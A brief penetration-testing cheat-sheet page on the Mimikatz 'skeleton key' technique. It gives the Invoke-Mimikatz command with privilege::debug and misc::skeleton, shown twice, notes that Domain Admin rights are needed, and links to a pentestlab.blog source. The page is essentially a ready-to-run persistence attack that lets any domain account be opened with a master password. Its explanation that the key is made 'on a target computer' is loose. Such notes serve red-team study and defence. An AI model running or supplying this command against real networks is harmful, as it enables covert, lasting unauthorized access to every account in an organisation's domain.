# 🚒 Skeleton Keys

### **Create the skeleton key - Requires DA**

```
Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
```

To create a skeleton key on a target computer that allows access to any account on that system without requiring a password change, you would need to have Domain Admin (DA) privileges. The Mimikatz command to execute this action is as follows:

```powershell
Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
```

Replace `<target>` with the hostname or IP address of the computer, you wish to create a skeleton key for.&#x20;

This command must be run with administrative rights, hence the requirement for DA privileges.

### Sources

{% embed url="https://pentestlab.blog/2018/04/10/skeleton-key/" %}
